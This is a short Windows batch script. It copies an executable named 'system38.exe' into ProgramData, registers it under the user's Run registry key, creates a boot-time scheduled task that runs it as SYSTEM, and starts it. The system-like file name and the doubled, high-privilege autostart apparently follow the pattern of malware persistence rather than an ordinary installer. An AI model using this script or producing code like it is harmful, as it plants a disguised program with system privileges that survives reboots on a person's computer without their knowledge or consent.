@echo off
setlocal
set "TARGET=C:\ProgramData\MyApp"
set "EXENAME=system38.exe"
if not exist "%TARGET%" mkdir "%TARGET%"
copy /Y "%~dp0%EXENAME%" "%TARGET%\%EXENAME%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyApp" /t REG_SZ /d "%TARGET%\%EXENAME%" /f
schtasks /create /tn "MyAppStartup" /tr "%TARGET%\%EXENAME%" /sc onstart /ru SYSTEM /f
start "" "%TARGET%\%EXENAME%"